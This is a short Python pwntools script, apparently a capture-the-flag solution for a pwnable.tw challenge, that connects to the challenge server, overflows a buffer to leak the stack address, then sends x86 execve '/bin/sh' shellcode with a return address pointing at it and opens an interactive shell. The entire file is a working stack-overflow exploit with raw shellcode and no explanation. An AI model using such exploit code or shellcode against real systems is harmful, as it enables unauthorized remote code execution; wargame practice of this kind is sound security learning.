from pwn import * 

host = "chall.pwnable.tw"
port = 10000

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

con = remote(host, port)
print (con.recv(1024))

get_sp_string = 20 * 'a' + '\x87\x80\x04\x08'
con.send(get_sp_string)
sp_addr = u32(con.recv(1024)[0:4])

real_shellcode = 20 * 'a' + p32(sp_addr + 20) + shellcode
con.send(real_shellcode)
con.interactive()
con.close()
